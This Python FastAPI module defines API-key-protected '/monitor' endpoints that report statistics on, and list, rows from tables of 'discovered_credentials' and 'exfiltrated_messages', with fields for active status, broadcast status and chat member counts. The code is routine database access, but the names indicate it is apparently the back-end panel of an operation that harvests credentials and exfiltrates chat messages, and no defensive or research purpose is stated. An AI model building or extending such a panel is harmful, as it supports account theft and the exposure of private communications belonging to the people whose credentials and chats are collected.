from fastapi import APIRouter, HTTPException, Header
from typing import List
from app.core.database import db
from app.schemas.models import CredentialOut, MessageOut, StatsOut
from app.core.config import settings

router = APIRouter(prefix="/monitor", tags=["Monitor"])


def _check_monitor_auth(x_monitor_key: str | None):
    """Raises 403 if key is absent or wrong. Raises 503 if key not configured on server."""
    if not settings.MONITOR_API_KEY:
        raise HTTPException(status_code=503, detail="Monitor API key not configured on server")
    if not x_monitor_key or x_monitor_key != settings.MONITOR_API_KEY:
        raise HTTPException(status_code=403, detail="Invalid or missing monitor API key")


@router.get("/stats", response_model=StatsOut)
async def get_stats(x_monitor_key: str | None = Header(None)):
    """Get system stats. Requires X-Monitor-Key header if MONITOR_API_KEY is configured."""
    _check_monitor_auth(x_monitor_key)
    try:
        c_res = db.table("discovered_credentials").select("*", count="exact").execute()
        total_creds = c_res.count if c_res.count is not None else len(c_res.data)

        ca_res = db.table("discovered_credentials").select("*", count="exact").eq("status", "active").execute()
        active_creds = ca_res.count if ca_res.count is not None else len(ca_res.data)

        m_res = db.table("exfiltrated_messages").select("*", count="exact").execute()
        total_msgs = m_res.count if m_res.count is not None else len(m_res.data)

        b_res = db.table("exfiltrated_messages").select("*", count="exact").eq("is_broadcasted", True).execute()
        bc_msgs = b_res.count if b_res.count is not None else len(b_res.data)

        return StatsOut(
            credentials_total=total_creds,
            credentials_active=active_creds,
            messages_exfiltrated=total_msgs,
            messages_broadcasted=bc_msgs
        )
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/credentials", response_model=List[CredentialOut])
async def list_credentials(
    limit: int = 100,
    sort_by: str = "created_at",
    order: str = "desc",
    x_monitor_key: str | None = Header(None),
):
    """List recent credentials.

    Args:
        limit: 1-1000 (clamped). Default 100.
        sort_by: one of 'created_at' (default), 'updated_at', 'confidence_score',
                 'chat_member_count'. The latter two read from meta jsonb.
        order: 'desc' (default) or 'asc'.

    Requires X-Monitor-Key header if MONITOR_API_KEY is configured.
    """
    _check_monitor_auth(x_monitor_key)
    limit = max(1, min(limit, 1000))
    desc = order.lower() != "asc"

    # Whitelist sort keys — never trust user input as a column reference.
    # confidence_score and chat_member_count are STORED generated columns
    # (see migration 004) so sorts are real INT, not jsonb-string lex sort.
    allowed_sorts = {"created_at", "updated_at", "confidence_score", "chat_member_count"}
    sort_expr = sort_by if sort_by in allowed_sorts else "created_at"

    try:
        q = db.table("discovered_credentials").select("*")
        if sort_expr in ("confidence_score", "chat_member_count"):
            try:
                # nullslast keeps unscored legacy rows out of the way on desc.
                res = q.order(sort_expr, desc=desc, nullsfirst=not desc).limit(limit).execute()
            except Exception as e:
                # Migration 004 not applied yet — column doesn't exist. Fall back.
                msg = str(e).lower()
                if "confidence_score" in msg or "chat_member_count" in msg or "column" in msg:
                    res = (
                        db.table("discovered_credentials")
                        .select("*")
                        .order("created_at", desc=True)
                        .limit(limit)
                        .execute()
                    )
                else:
                    raise
        else:
            res = q.order(sort_expr, desc=desc).limit(limit).execute()
        return res.data
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/messages", response_model=List[MessageOut])
async def list_messages(limit: int = 100, x_monitor_key: str | None = Header(None)):
    """List recent exfiltrated messages. Requires X-Monitor-Key header if MONITOR_API_KEY is configured."""
    _check_monitor_auth(x_monitor_key)
    limit = max(1, min(limit, 1000))  # Clamp to [1, 1000]
    try:
        res = db.table("exfiltrated_messages").select("*").order("created_at", desc=True).limit(limit).execute()
        return res.data
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
